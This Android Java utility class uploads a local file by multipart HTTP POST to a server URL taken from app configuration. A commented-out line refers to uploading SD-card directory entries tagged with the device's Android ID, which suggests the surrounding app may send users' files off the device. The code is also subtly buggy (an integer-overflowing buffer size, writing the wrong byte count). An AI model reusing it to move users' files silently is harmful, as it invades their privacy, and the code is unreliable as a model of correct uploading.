package u.can.i.up.expert.utils;

import android.os.AsyncTask;
import android.util.Log;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import u.can.i.up.expert.common.DataSet;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class UploadFile extends AsyncTask<String, Void, String> {
    String j = "";
    String i = "";
    public UploadFile(String j, String i) {
        this.j = j;
        this.i = i;
    }
    @Override
    protected String doInBackground(String... params) {

        File sd = new File(j);
        if(sd.exists())
        {
            HttpURLConnection connection = null;
            DataOutputStream outputStream = null;
            DataInputStream inputStream = null;

            String pathToOurFile = j;
            String urlServer = DataSet.getInstance().URL + i;

            Log.i("com.connect", "pathToOurFile : " + pathToOurFile);
            Log.i("com.connect","urlServer : " + urlServer);


            String lineEnd = "\r\n";
            String twoHyphens = "--";
            String boundary =  "*****";
            int bytesRead, bytesAvailable, bufferSize;
            byte[] buffer;
            int maxBufferSize = 1*1024*1024*1000*10;

            try
            {
                FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile) );

                URL url = new URL(urlServer);
                connection = (HttpURLConnection) url.openConnection();

                // Allow Inputs & Outputs
                connection.setDoInput(true);
                connection.setDoOutput(true);
                connection.setUseCaches(false);

                // Enable POST method
                connection.setRequestMethod("POST");

                connection.setRequestProperty("Connection", "Keep-Alive");
                connection.setRequestProperty("Content-Type", "multipart/form-data;boundary="+boundary);

                outputStream = new DataOutputStream( connection.getOutputStream() );
                outputStream.writeBytes(twoHyphens + boundary + lineEnd);
                outputStream.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\"" + pathToOurFile +"\"" + lineEnd);
                outputStream.writeBytes(lineEnd);

                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                buffer = new byte[bufferSize];

                // Read file
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);

                while (bytesRead > 0)
                {
                    outputStream.write(buffer, 0, bufferSize);
                    bytesAvailable = fileInputStream.available();
                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                }

                outputStream.writeBytes(lineEnd);
                outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                // Responses from the server (code and message)
                int serverResponseCode = connection.getResponseCode();
                String serverResponseMessage = connection.getResponseMessage();
                fileInputStream.close();
                outputStream.flush();
                outputStream.close();
//				        getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Uploading:" + sdDirList[k].toString() + " Complete");
            }
            catch (Exception ex)
            {ex.printStackTrace();}
        }
        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {}
    @Override
    protected void onPreExecute() {}
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}